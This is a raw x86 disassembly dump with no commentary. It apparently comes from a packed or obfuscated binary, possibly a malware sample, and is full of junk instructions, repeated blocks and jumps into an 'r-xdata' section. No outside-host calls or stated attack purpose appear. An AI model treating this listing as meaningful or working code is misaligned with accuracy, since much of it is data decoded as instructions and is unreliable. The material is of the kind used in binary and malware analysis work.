pop eax
jg r-xdata
push edi
push ecx
call sub_40335d
add edx 0xff05e852
jne 0xffffffffc2c16161
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
add esp 0x4
jno r-xdata
push ebp
pushfd
push eax
pushfd
add ebx 0xdc7f585a
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push esp
push eax
call sub_4033a4
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b8af
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1423f
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
jo 0xffffffff894f8d65
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
insd
sub_403478
sub esp 0x14
push ebp
push edi
push esp
sub esp 0x8
call sub_403523
jns 0xffffffff9cc143e5
add [ eax ] al
add [ 0xffffffff850f595a ] cl
jns r-xdata
jmp 0x1001d03
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
push eax
push ecx
sub esp 0x10
call sub_40351f
jo 0xffffffffff29c2e0
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59754211
jae r-xdata
or eax 0x15ff2875
push esi
call sub_40356e
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jne r-xdata
jpe 0x18c344da
jns r-xdata
add ebx 0x9c575756
jae r-xdata
or eax 0x8d0fb671
jne r-xdata
call 0xffffffffcec17767
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
pop edx
jne r-xdata
ja 0xffffffffe85bb449
jae r-xdata
jl 0xffffffffa1a4c783
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
call sub_40353d
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c14457
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e8aa
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
pop ecx
add eax 0xfefc8d0f
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1d28e
jg r-xdata
jge 0x18abaf8
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
jno r-xdata
xor eax 0xff56850f
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jg r-xdata
jge 0xffffffffc009ab0e
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jg r-xdata
jl 0xe24a8c7
add esp 0x4
ja r-xdata
jge 0x100b996
jns r-xdata
add esi 0x99870f
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f83c
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jns r-xdata
xor esi 0x76795a59
jb 0x120b933
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jo 0xc647a5c
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jge r-xdata
call sub_403530
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14def
jae r-xdata
jpo 0x36288e35
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7288e85
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
or eax 0x850f595a
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba9da
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13be65
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_40351f
jge r-xdata
add esp 0x8
jge 0xffffffff874fe79c
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jg r-xdata
jge r-xdata
js 0x59754211
jae r-xdata
or eax 0x15ff2875
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jne r-xdata
jpe 0x18c344da
jns r-xdata
add ebx 0x9c575756
jae r-xdata
jo 0xc647a5c
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
call 0xffffffffcec17767
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
pop edx
jne r-xdata
ja 0xffffffffe85bb449
jae r-xdata
jl 0xffffffffa1a4c783
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
jae r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jge r-xdata
call sub_403530
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
push es
jno r-xdata
mov esp 0xd2775a59
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
call sub_40353d
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c14457
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e8aa
push esi
call sub_40356e
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jg r-xdata
jge 0x18abaf8
sub esp 0x1c
jge r-xdata
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1001d03
push eax
push ecx
sub esp 0x10
call sub_40351f
jo 0xffffffffff29c2e0
or esi 0xf04c483
xor ebp 0xfffffffe
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pop ecx
add eax 0xfefc8d0f
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
jae r-xdata
or eax 0x8d0fb671
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1d28e
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
add esp 0x4
ja r-xdata
jge 0x100b996
jns r-xdata
add esi 0x99870f
jno r-xdata
xor eax 0xff56850f
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f83c
jg r-xdata
jge 0xffffffffc009ab0e
jns r-xdata
xor esi 0x76795a59
jb 0x120b933
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jl 0xe24a8c7
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14def
jae r-xdata
jpo 0x36288e35
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7288e85
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba9da
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13be65
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_403523
jne r-xdata
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e8aa
pop ecx
pop edx
ja r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
pop eax
jno r-xdata
jns r-xdata
or esi 0x890f537f
pop edx
jne r-xdata
ja 0xffffffffe85bb449
jge r-xdata
sub edx 0xf281e771
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1d28e
jns r-xdata
add ebx 0x9c575756
call sub_40353d
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c14457
jae r-xdata
pop edx
jns r-xdata
sub edx 0xee815d71
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
jpe 0x18c344da
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jno r-xdata
xor eax 0xff56850f
push esi
call sub_40356e
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jne r-xdata
jl 0xffffffffa1a4c783
jg r-xdata
jge 0x18abaf8
pop ecx
add eax 0xfefc8d0f
jg r-xdata
jge 0xffffffffc009ab0e
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1001d03
push eax
push ecx
sub esp 0x10
call sub_40351f
jo 0xffffffffff29c2e0
or esi 0xf04c483
xor ebp 0xfffffffe
jge r-xdata
js 0x59754211
jae r-xdata
or eax 0x15ff2875
pop ecx
jae r-xdata
mov ecx 0x59054979
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jg r-xdata
jl 0xe24a8c7
jae r-xdata
or eax 0x8d0fb671
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
call 0xffffffffcec17767
jno r-xdata
add ecx 0x8d0f3a7d
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
add esp 0x4
ja r-xdata
jge 0x100b996
jns r-xdata
add esi 0x99870f
jae r-xdata
jo 0xc647a5c
jne r-xdata
xor edi 0x5c775a59
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f83c
jge r-xdata
call sub_403530
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
xor esi 0x76795a59
jb 0x120b933
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jae r-xdata
or esi 0x937f5959
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14def
jae r-xdata
jpo 0x36288e35
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7288e85
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba9da
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13be65
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_403530
jno r-xdata
pop ecx
pop ecx
jg r-xdata
xor edx 0x59bc4079
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jns r-xdata
or esi 0x890f537f
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e8aa
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1d28e
jns r-xdata
add ebx 0x9c575756
jne r-xdata
xor edi 0x5c775a59
pop edx
ja r-xdata
pop ecx
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
pop eax
jno r-xdata
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
pop edx
jne r-xdata
ja 0xffffffffe85bb449
jge r-xdata
sub edx 0xf281e771
jno r-xdata
xor eax 0xff56850f
push esi
call sub_40356e
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jae r-xdata
or esi 0x937f5959
call sub_40353d
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c14457
jae r-xdata
pop edx
jns r-xdata
sub edx 0xee815d71
jno r-xdata
mov esp 0xd2775a59
jg r-xdata
jge 0xffffffffc009ab0e
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1001d03
push eax
push ecx
sub esp 0x10
call sub_40351f
jo 0xffffffffff29c2e0
or esi 0xf04c483
xor ebp 0xfffffffe
jge r-xdata
js 0x59754211
jae r-xdata
or eax 0x15ff2875
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
jpe 0x18c344da
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jg r-xdata
jl 0xe24a8c7
jae r-xdata
or eax 0x8d0fb671
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
jne r-xdata
jl 0xffffffffa1a4c783
jg r-xdata
jge 0x18abaf8
pop ecx
add eax 0xfefc8d0f
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
jg r-xdata
sub ecx 0xce819d75
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
call 0xffffffffcec17767
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jae r-xdata
jo 0xc647a5c
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jge r-xdata
call sub_403530
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
add esp 0x4
ja r-xdata
jge 0x100b996
jns r-xdata
add esi 0x99870f
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f83c
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jns r-xdata
xor esi 0x76795a59
jb 0x120b933
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14def
jae r-xdata
jpo 0x36288e35
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7288e85
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba9da
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13be65
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_40353d
jg r-xdata
pop eax
pop ecx
jge r-xdata
jns 0xffffffff8202ae9f
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
retn
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
add eax 0xfefc8d0f
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop edx
jne r-xdata
ja 0xffffffffe85bb449
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c14457
jae r-xdata
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
push eax
push ecx
sub esp 0x10
call sub_40351f
jo 0xffffffffff29c2e0
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59754211
jae r-xdata
or eax 0x15ff2875
